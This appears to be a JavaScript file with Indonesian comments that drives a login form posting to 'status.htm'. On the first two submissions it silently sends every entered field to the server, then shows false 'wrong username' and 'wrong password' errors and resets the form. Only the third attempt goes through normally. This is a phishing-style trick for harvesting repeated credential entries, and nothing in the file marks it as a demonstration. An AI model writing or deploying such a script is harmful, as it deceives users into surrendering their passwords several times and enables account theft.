// <script type="text/javascript">
// javascript versi v0.4

// Saat halaman dimuat, arahkan kursor langsung ke kolom username
document.login.username.focus();

// Ambil elemen form berdasarkan atribut name="login"
const loginForm = document.getElementsByName("login")[0];

// Pasang event listener ketika form dikirim (submit)
loginForm.addEventListener("submit", function (e) {

    // Ambil jumlah percobaan submit dari localStorage
    // Jika belum ada, gunakan nilai awal 0
    let count = parseInt(localStorage.getItem("submitCount") || "0");
    count++;

    // Kondisi untuk percobaan pertama dan kedua
    if (count < 3) {

        // Hentikan pengiriman form secara normal
        e.preventDefault();

        // Sembunyikan form dan tampilkan pesan pemrosesan
        // document.getElementById("title").style.display = "none"; // sembunyikan id title pada blok   <h2 id="title">Sign In</h2>
        e.target.style.display = "none";
        document.getElementById("loading").style.display = "block"; // sembunyikan id loading pada blok   <div id="loading" style="display:none; text-align:center; margin-top:20px;"></div>
        document.getElementById("loading").innerHTML = "Mengirim data ke status.htm...";

        // Jalankan proses setelah jeda 2,5 detik
        setTimeout(() => {

            // Siapkan pengiriman data menggunakan XMLHttpRequest
            let form = e.target;
            let xhr = new XMLHttpRequest();
            xhr.open(form.method, form.action);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

            // Ambil seluruh field dalam form dan ubah menjadi format URL-encoded
            let data = [];
            for (let i = 0; i < form.elements.length; i++) {
                let el = form.elements[i];
                if (el.name) {
                    data.push(
                        encodeURIComponent(el.name) + "=" + encodeURIComponent(el.value)
                    );
                }
            }

            // Kirim data ke server
            xhr.send(data.join("&"));

            // Simpan kembali jumlah percobaan ke localStorage
            localStorage.setItem("submitCount", count);

            // Kembalikan kondisi form seperti semula
            form.reset();
            form.style.display = "block";
            document.getElementById("loading").style.display = "none"; // Tampilkan Kembali id loading pada blok   <div id="loading" style="display:none; text-align:center; margin-top:20px;"></div>
            // document.getElementById("title").style.display = "block"; // Tampilkan Kembali id title pada blok   <h2 id="title">Sign In</h2>

            document.login.username.focus();

            // Tampilkan pesan kesalahan untuk username dan password
            document.getElementById("errUser").style.display = "block";
            document.getElementById("errUser").innerText = "username yang anda masukan salah";

            document.getElementById("errPass").style.display = "block";
            document.getElementById("errPass").innerText = "password yang anda masukan salah";

        }, 2500);

    } else {
        // Percobaan ketiga: form dikirim secara normal ke status.htm

        // Hapus penghitung agar siklus dimulai dari awal
        localStorage.removeItem("submitCount");

        // Sembunyikan pesan kesalahan sebelum form terkirim
        document.getElementById("errUser").style.display = "none";
        document.getElementById("errPass").style.display = "none";
    }
});
// </script>
